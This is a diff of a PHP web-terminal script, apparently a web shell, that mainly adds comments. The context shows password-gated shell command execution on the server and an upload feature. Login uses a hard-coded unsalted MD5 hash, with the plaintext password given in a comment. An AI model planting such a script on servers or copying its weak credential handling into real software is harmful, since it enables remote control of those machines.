@@ -14,32 +14,33 @@
  * - Fixed header layout to a two-column design and added a live clock.
  */
 
+// --- Basic Setup ---
 session_start();
 date_default_timezone_set('Asia/Manila');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/term_error_log');
 error_reporting(E_ALL);
-ini_set('display_errors', 0); 
-set_time_limit(0); 
-ob_implicit_flush(); 
+ini_set('display_errors', 0); // Keep this off for security
+set_time_limit(0); // Allow script to run indefinitely for long tasks
+ob_implicit_flush(); // Ensure output is sent immediately
 
-
+// --- Version Information ---
 $version = '1.2.2';
 
-
+// --- System Detection ---
 $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 
 // --- MD5 Password ---
 $default_password_hash = '2ebba5cd75576c408240e57110e7b4ff'; // MD5 for "myp@ssw0rd"
 
--
+// --- Function Utilities ---
 function is_function_enabled($func) {
     if (!function_exists($func)) return false;
     $disabled = explode(',', ini_get('disable_functions'));
     return !in_array($func, array_map('trim', $disabled));
 }
 
-
+// --- Legacy Command Execution (for short commands) ---
 function execute_command($command, $cwd) {
     global $is_windows;
     $full_command = $is_windows
@@ -66,21 +67,21 @@ function execute_command($command, $cwd) {
 }
 
 
-
+// --- Request Handling ---
 $login_error = '';
 $upload_message = '';
 
-
+// Handle Logout
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['logout'])) {
     session_destroy();
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
-
+// Check Login Status
 $is_logged_in = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
 
-
+// Handle Login
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
     if (md5($_POST['password']) === $default_password_hash) {
         $_SESSION['authenticated'] = true;
